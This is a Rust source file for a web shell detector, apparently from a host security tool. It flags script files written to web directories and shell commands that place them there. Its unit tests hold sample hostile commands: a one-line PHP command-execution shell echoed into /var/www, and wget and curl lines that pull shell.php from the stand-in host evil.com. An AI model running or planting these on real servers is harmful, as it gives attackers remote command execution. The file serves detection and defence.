#[allow(clippy::too_many_arguments)]
use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

/// Detects web shells being created or written in web-accessible directories.
///
/// Web shells are a primary post-exploitation tool: an attacker uploads a
/// script (PHP, JSP, ASP, CGI) to a web root, then uses it as a remote
/// command-and-control channel via HTTP.
///
/// Detection patterns:
///   - File created/written in web paths with suspicious extensions
///   - Command execution that writes script files to web directories
///     (echo > .php, wget .php, curl > .php)
///
/// Web directories:
///   /var/www/, /usr/share/nginx/, /var/lib/nginx/,
///   /srv/http/, /opt/lampp/htdocs/
///
/// Suspicious extensions: .php, .jsp, .jspx, .asp, .aspx, .cgi, .pl, .py
///
/// Allowlisted deployer processes:
///   apt, dpkg, pip, composer, npm, git, rsync, cp
pub struct WebShellDetector {
    host: String,
    cooldown: Duration,
    /// Suppress re-alerts per (key) within cooldown window.
    alerted: HashMap<String, DateTime<Utc>>,
}

/// Web-accessible directory prefixes.
const WEB_PATHS: &[&str] = &[
    "/var/www/",
    "/usr/share/nginx/",
    "/var/lib/nginx/",
    "/srv/http/",
    "/opt/lampp/htdocs/",
];

/// Extensions that are commonly used for web shells.
const SUSPICIOUS_EXTENSIONS: &[&str] = &[
    ".php", ".jsp", ".jspx", ".asp", ".aspx", ".cgi", ".pl", ".py",
];

/// Processes that legitimately deploy files to web directories.
const ALLOWED_DEPLOYERS: &[&str] = &[
    "apt", "dpkg", "pip", "pip3", "composer", "npm", "git", "rsync", "cp",
];

impl WebShellDetector {
    pub fn new(host: impl Into<String>, cooldown_seconds: u64) -> Self {
        Self {
            host: host.into(),
            cooldown: Duration::seconds(cooldown_seconds as i64),
            alerted: HashMap::new(),
        }
    }

    /// Returns true if the path is inside a web-accessible directory.
    fn is_web_path(path: &str) -> bool {
        WEB_PATHS.iter().any(|prefix| path.starts_with(prefix))
    }

    /// Returns true if the file has a suspicious web shell extension.
    fn has_suspicious_extension(path: &str) -> bool {
        let lower = path.to_lowercase();
        SUSPICIOUS_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        match event.kind.as_str() {
            "file.write_access" => self.check_file_write(event),
            "shell.command_exec" => self.check_command(event),
            _ => None,
        }
    }

    fn check_file_write(&mut self, event: &Event) -> Option<Incident> {
        let filename = event.details.get("filename").and_then(|v| v.as_str())?;

        // Must be in a web directory
        if !Self::is_web_path(filename) {
            return None;
        }

        // Must have a suspicious extension
        if !Self::has_suspicious_extension(filename) {
            return None;
        }

        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        // Skip known legitimate deployer processes
        if ALLOWED_DEPLOYERS.contains(&comm) {
            return None;
        }

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        self.emit_incident(
            event.ts,
            "file_write",
            comm,
            pid,
            uid,
            filename,
            &format!(
                "Suspicious web shell file written by {comm} (pid={pid}, uid={uid}): \
                 {filename} — script file created in web directory"
            ),
        )
    }

    fn check_command(&mut self, event: &Event) -> Option<Incident> {
        let command = event.details.get("command").and_then(|v| v.as_str())?;
        if command.is_empty() {
            return None;
        }

        let lower = command.to_lowercase();
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        // Skip known deployers
        if ALLOWED_DEPLOYERS.contains(&comm) {
            return None;
        }

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        // Check for writing script files to web dirs via command
        let is_web_shell_command = Self::is_command_web_shell_write(&lower);

        if is_web_shell_command {
            let display_cmd = if command.len() > 200 {
                format!("{}...", &command[..200])
            } else {
                command.to_string()
            };

            return self.emit_incident(
                event.ts,
                "command_write",
                comm,
                pid,
                uid,
                &display_cmd,
                &format!(
                    "Web shell deployment via command by {comm} (pid={pid}, uid={uid}): \
                     {display_cmd}"
                ),
            );
        }

        None
    }

    /// Checks if a command writes a web shell file to a web directory.
    fn is_command_web_shell_write(lower: &str) -> bool {
        // Must target a web directory
        let targets_web_dir = WEB_PATHS.iter().any(|p| lower.contains(p));
        if !targets_web_dir {
            return false;
        }

        // Must target a suspicious extension
        let targets_shell_ext = SUSPICIOUS_EXTENSIONS.iter().any(|ext| lower.contains(ext));
        if !targets_shell_ext {
            return false;
        }

        // Match patterns: echo > .php, wget .php, curl > .php
        lower.contains("echo") && lower.contains('>')
            || lower.contains("wget")
            || lower.contains("curl") && lower.contains('>')
    }

    fn emit_incident(
        &mut self,
        ts: DateTime<Utc>,
        pattern: &str,
        comm: &str,
        pid: u32,
        uid: u32,
        target: &str,
        summary: &str,
    ) -> Option<Incident> {
        let key = format!("{pattern}:{comm}:{target}");

        // Cooldown check
        if let Some(&last) = self.alerted.get(&key) {
            if ts - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, ts);

        // Prune stale entries
        if self.alerted.len() > 1000 {
            let cutoff = ts - self.cooldown;
            self.alerted.retain(|_, t| *t > cutoff);
        }

        Some(Incident {
            ts,
            host: self.host.clone(),
            incident_id: format!(
                "web_shell:{pattern}:{pid}:{}",
                ts.format("%Y-%m-%dT%H:%MZ")
            ),
            severity: Severity::Critical,
            title: format!("Web shell detected ({pattern}): {}", truncate(target, 120)),
            summary: summary.to_string(),
            evidence: serde_json::json!([{
                "kind": "web_shell",
                "pattern": pattern,
                "comm": comm,
                "pid": pid,
                "uid": uid,
                "target": target,
            }]),
            recommended_checks: vec![
                format!("Remove the suspicious file immediately if confirmed: rm {target}"),
                format!("Investigate process {comm} (pid={pid}) and how it got shell access"),
                "Check web server access logs for exploitation attempts".to_string(),
                "Search for additional web shells: find /var/www -name '*.php' -newer /var/log/syslog".to_string(),
                "Review web application for upload vulnerabilities".to_string(),
            ],
            tags: vec![
                "web_shell".to_string(),
                "post_exploitation".to_string(),
            ],
            entities: vec![EntityRef::path(target)],
        })
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use innerwarden_core::event::Severity as Sev;

    fn file_write_event(comm: &str, filename: &str, uid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.write_access".to_string(),
            severity: Sev::Info,
            summary: format!("{comm} writing {filename}"),
            details: serde_json::json!({
                "pid": 1234,
                "uid": uid,
                "ppid": 1,
                "comm": comm,
                "filename": filename,
                "write": true,
                "flags": 1,
                "cgroup_id": 0,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn command_event(comm: &str, command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Sev::Info,
            summary: format!("Command: {command}"),
            details: serde_json::json!({
                "pid": 5678,
                "uid": 1000,
                "ppid": 1,
                "comm": comm,
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_php_in_var_www() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&file_write_event(
                "www-data",
                "/var/www/html/shell.php",
                33,
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("file_write"));
    }

    #[test]
    fn detects_jsp_in_nginx() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&file_write_event(
                "java",
                "/usr/share/nginx/html/cmd.jsp",
                1000,
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn detects_aspx_in_srv_http() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&file_write_event(
                "w3wp",
                "/srv/http/backdoor.aspx",
                1000,
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn detects_echo_php_command() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&command_event(
                "bash",
                "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("command_write"));
    }

    #[test]
    fn detects_wget_php() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&command_event(
                "bash",
                "wget http://evil.com/shell.php -O /var/www/html/shell.php",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn detects_curl_php() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&command_event(
                "bash",
                "curl http://evil.com/shell.php > /var/www/html/shell.php",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn allows_apt_deployer() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event("apt", "/var/www/html/index.php", 0, now))
            .is_none());
    }

    #[test]
    fn allows_git_deployer() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event("git", "/var/www/html/app.php", 1000, now))
            .is_none());
    }

    #[test]
    fn ignores_non_web_path() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event("bash", "/tmp/shell.php", 1000, now))
            .is_none());
        assert!(det
            .process(&file_write_event("bash", "/home/user/shell.php", 1000, now))
            .is_none());
    }

    #[test]
    fn ignores_non_suspicious_extension() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/index.html",
                1000,
                now
            ))
            .is_none());
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/style.css",
                1000,
                now
            ))
            .is_none());
    }

    #[test]
    fn cooldown_suppresses_duplicate() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/shell.php",
                1000,
                now
            ))
            .is_some());
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/shell.php",
                1000,
                now + Duration::seconds(10)
            ))
            .is_none());
    }

    #[test]
    fn fires_again_after_cooldown() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/shell.php",
                1000,
                now
            ))
            .is_some());
        assert!(det
            .process(&file_write_event(
                "bash",
                "/var/www/html/shell.php",
                1000,
                now + Duration::seconds(301)
            ))
            .is_some());
    }

    #[test]
    fn ignores_irrelevant_events() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let event = Event {
            ts: now,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.outbound_connect".to_string(),
            severity: Sev::Info,
            summary: "network event".to_string(),
            details: serde_json::json!({}),
            tags: vec![],
            entities: vec![],
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn detects_cgi_extension() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&file_write_event(
                "bash",
                "/var/www/cgi-bin/backdoor.cgi",
                1000,
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn detects_py_in_lampp() {
        let mut det = WebShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&file_write_event(
                "python3",
                "/opt/lampp/htdocs/shell.py",
                1000,
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }
}
